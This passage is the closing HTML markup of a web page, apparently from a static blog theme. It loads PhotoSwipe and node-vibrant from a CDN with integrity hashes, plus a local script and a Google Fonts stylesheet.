                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer="true"
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >
            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                defer="false"
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
